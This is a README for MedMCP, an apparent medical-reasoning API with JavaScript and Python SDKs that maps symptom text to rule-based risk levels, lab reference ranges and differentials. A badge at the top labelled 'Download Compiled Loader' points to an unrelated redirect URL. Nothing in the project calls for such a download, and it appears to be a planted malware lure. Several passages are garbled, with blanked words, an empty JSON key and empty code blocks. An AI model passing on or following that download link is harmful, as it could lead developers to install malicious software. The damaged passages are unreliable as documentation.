# MedMCP

[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)

Medical reasoning API for AI agents. Converts clinical input into structured risk signals.

![CI](https://github.com/medmcp-dev/core/actions/workflows/ci.yml/badge.svg)

**Website:** https://medmcp.vercel.app

```bash
npm install @medmcp/sdk
```

### Quality gates

Run locally before a  or large change:

```bash
# Core build + analyze tests (risk-mapper unit + symptom-engine contract w/ seeded DB)
npm ci && npm run build && npm run test:analyze

# TypeScript SDK
cd sdk && npm ci && npm test

# Python SDK
cd sdk-python && python -m unittest discover -s tests -p "test_*.py"
```

CI runs the same checks on push and pull requests to `main` (see `.github/workflows/ci.yml`).

** notes:** see [`.md`](./.md). Before a tagged , update that file and bump `version` in the root `package.json` (and SDK package versions when you publish them).

**Agent / HTTP clients:** every `/v1/*` response includes `X-MedMCP-Schema-Version`, `X-MedMCP-`, and optional `X-MedMCP-Git-Revision` / `X-MedMCP-Data-Revision` (see `GET /v1/schema` → `agent_tooling`). CORS exposes these headers to browsers.

---

## What it is

MedMCP is the deterministic medical reasoning layer for AI agents — structured clinical risk signals, drug interactions, and differential diagnosis without prompt drift or hallucination.

**Scribe / documentation:** Feed patient notes into your agent and route on `risk_level: critical` — MedMCP handles the medical reasoning, you own the UX.

**Intake / triage:** Replace ad-hoc symptom parsing with a shared output contract — same input always returns the same structured risk signal, regardless of which model powers your agent.

**Clinical copilot:** Give your copilot deterministic answers on drug interactions and differentials — no prompting, no fine-tuning, no medical knowledge base to maintain.

**Not a diagnosis tool. Not a consumer product. Infrastructure.**

---

## Quickstart

### JavaScript / TypeScript

```bash
npm install @medmcp/sdk
```

```ts
import { MedMCP } from '@medmcp/sdk';

const client = new MedMCP({
  apiKey: 'mk_your_key_here',
  timeoutMs: 10_000,  // optional
  maxRetries: 2,      // optional, retries 429/5xx
  retryDelayMs: 250   // optional
});

const result = await client.analyze('chest pain for 2 hours');
const lab = await client.labGet('troponin');
const categories = await client.labCategories();
await client.waitlistJoin('user@example.com');

console.log(result.risk_level);      // "high"
console.log(result.interpretation);  // "1 symptom(s) identified: chest pain. Top differential: pulmonary embolism..."
console.log(lab.lab_value.reference_range);
console.log(categories.categories);
```

### Python

```bash
pip install medmcp
```

```python
from medmcp import MedMCP

client = MedMCP(
    api_key="mk_your_key_here",
    timeout_ms=10_000,
    max_retries=2,
    retry_delay_ms=250,
)
result = client.analyze("chest pain for 2 hours")
lab = client.lab_get("troponin")
all_labs = client.lab_list("cardiac")
client.waitlist_join("user@example.com")

print(result.risk_level)      # "high"
print(result.interpretation)  # "1 symptom(s) identified: chest pain. Top differential: pulmonary embolism..."
print(lab["lab_value"].reference_range)
print(all_labs["count"])
```

### curl

```bash
curl -X POST https://core-production-389e.up.railway.app/v1/analyze \
  -H "X-API-Key: YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"type":"symptom","data":{"text":"chest pain for 2 hours"}}'
```

Response:

```json
{
  "risk_level": "high",
  "confidence": 1,
  "entities": [
    { "type": "symptom", "value": "chest pain" },
    { "type": "diagnosis", "value": "pulmonary embolism", "metadata": { "match_score": 1, "icd11_code": "BB41" } }
  ],
  "source_type": "symptom",
  "interpretation": "1 symptom(s) identified: chest pain. Top differential: pulmonary embolism (match score: 1).",
  "signals": [
    { "type": "risk_driver", "label": "chest pain", "detail": "high-risk symptom" },
    { "type": "differential", "label": "pulmonary embolism", "detail": "match_score: 1" },
    { "type": "symptom_match", "label": "chest pain" }
  ]
}
```

Integration time: under 5 minutes.

**Zero-dependency scripts** (curl-free, same API): see [`examples/README.md`](examples/README.md) (Node + Python).

---

## SDK API

### TypeScript client methods (`@medmcp/sdk`)

- `analyze(text: string)`
- `health()`
- `schema()`
- `labGet(name: string)`
- `labList(category?: string)`
- `labCategories()`
- `waitlistJoin(email: string)`
- `waitlistList()`

Config options:

- `apiKey` (required)
- `baseUrl` (optional)
- `timeoutMs` (optional)
- `maxRetries` (optional; retries `429` and `5xx`)
- `retryDelayMs` (optional)

### Python client methods (`medmcp`)

- `analyze(text: str)`
- `health()`
- `schema()`
- `lab_get(name: str)`
- `lab_list(category: str | None = None)`
- `lab_categories()`
- `waitlist_join(email: str)`
- `waitlist_list()`

Constructor kwargs (optional, defaults match TypeScript SDK): `timeout_ms`, `max_retries` (retries `429` / `5xx`), `retry_delay_ms`. On socket timeout after retries, raises `RuntimeError` with the same message shape as the TS client.

---

## API Reference

### `POST /v1/analyze`

Converts clinical input into a structured risk signal.

**Request**

```json
{
  "type": "symptom",
  "data": {
    "text": "shortness of breath and racing heart"
  }
}
```

| Field | Type | Description |
|-------|------|-------------|
| `type` | `"symptom"` | Input type. Only `symptom` supported in v1. |
| `data.text` | `string` | Free-text clinical description. |

**Response schema (stable across all versions)**

```json
{
  "risk_level": "low | medium | high | critical",
  "confidence": 0.0,
  "entities": [],
  "source_type": "symptom | lab | vitals | medication",
  "interpretation": "string"
}
```

| Field | Description |
|-------|-------------|
| `risk_level` | Deterministic risk classification based on clinical red-flag criteria. |
| `confidence` | Fraction of extracted symptoms matched by at least one differential (0–1). |
| `entities` | Recognized symptoms, top differential diagnoses, ICD-11 codes. |
| `signals` | Structured breakdown: `risk_driver`, `differential`, `symptom_match` entries for agent routing. |
| `source_type` | Mirrors the input type. |
| `interpretation` | Short structured reasoning for agent consumption. |

---

### `GET /v1/health`

No auth required.

```json
{
  "status": "ok",
  "version": "1.0.0",
  "timestamp": "...",
  "": "0.1.0",
  "data_revision": "(optional — set MEDDATA_DATA_REVISION)",
  "git_revision": "(optional — set MEDDATA_GIT_REVISION or Railway auto)"
}
```

- `version`: public HTTP API compatibility
- ``: semver of `@medmcp/core` package at build/deploy
- `data_revision`: your opaque tag for seed/rules (recommended for reproducibility)

Request timing is logged as `[http] METHOD path status ms` for `/v1/*` except **`GET /v1/health`** (set `LOG_HTTP_HEALTH=1` to include health pings).

---

### `GET /v1/lab`

Look up reference ranges, critical values, and clinical interpretation for laboratory tests. Auth required.

**Query parameters**

| Parameter | Description |
|-----------|-------------|
| `name` | Lab test name or abbreviation (e.g. `sodium`, `Na+`, `Hb`, `troponin`, `CRP`) |
| `action` | `list` — returns all available tests; `categories` — returns category list |
| `category` | Filter by category when listing: `electrolytes`, `renal`, `metabolic`, `cardiac`, `inflammatory`, `haematology` |

```bash
# Look up a specific test
curl "https://core-production-389e.up.railway.app/v1/lab?name=troponin" \
  -H "X-API-Key: YOUR_API_KEY"

# List all lab tests in a category
curl "https://core-production-389e.up.railway.app/v1/lab?action=list&category=electrolytes" \
  -H "X-API-Key: YOUR_API_KEY"
```

Response (single test):

```json
{
  "lab_value": {
    "name": "troponin I",
    "abbreviation": "hs-TnI",
    "unit": "ng/L",
    "reference_range": "<14 (99th percentile, hs-TnI)",
    "critical_high": "52 ng/L",
    "category": "cardiac",
    "interpretation": "...",
    "clinical_notes": "..."
  }
}
```

---

### `GET /v1/schema`

Returns full input/output JSON schema. Auth required.

---

## Authentication

All endpoints (except `/v1/health`) require an API key:

```
X-API-Key: mk_your_key_here
```

---

## How risk_level is determined

Risk classification is **rule-based, not LLM-based**. Deterministic by design.

| Level | Criteria |
|-------|----------|
| `critical` | Red-flag symptom present: syncope, altered consciousness, haemoptysis |
| `high` | High-risk symptom present: chest pain, dyspnoea, tachycardia, palpitations |
| `medium` | ≥2 symptoms matched with at least one differential |
| `low` | Single mild symptom or no recognized symptoms |

---

## Self-hosting

### HTTP API

```bash
git clone https://github.com/medmcp-dev/core
cd core
npm install
npm run setup      # build + seed database
npm run start:http # starts on port 3000
```

Set `MEDDATA_API_KEY` in your environment to use a fixed key instead of auto-generated.

### MCP Server (stdio)

For direct AI agent integration via Model Context Protocol:

```bash
npm run setup
npm start
```

Add to your MCP client config:

```json
{
  "mcpServers": {
    "medmcp": {
      "command": "node",
      "args": ["/path/to/core/dist/index.js"]
    }
  }
}
```

**MCP tools available:** `get_medical_concept`, `get_drug_info`, `get_drug_interactions`, `get_icd11_code`, `get_differential_diagnosis`, `get_lab_value`

---

## Roadmap

| Phase | Status |
|-------|--------|
| Symptom → risk signal (`POST /v1/analyze`) | ✅ v1 |
| Lab result interpretation (`GET /v1/lab`) | ✅ v1 |
| Vitals processing | Planned |
| Medication context | Planned |
| JS SDK (`@medmcp/sdk`) | ✅ v1 |
| Python SDK (`medmcp`) | ✅ v1 |

---

```bash
```
```bash
```
## Medical disclaimer

MedMCP provides structured reference signals for AI agents and developers. It is not a substitute for clinical judgment, current prescribing guidelines, or peer-reviewed literature. Always verify critical clinical decisions against authoritative sources.
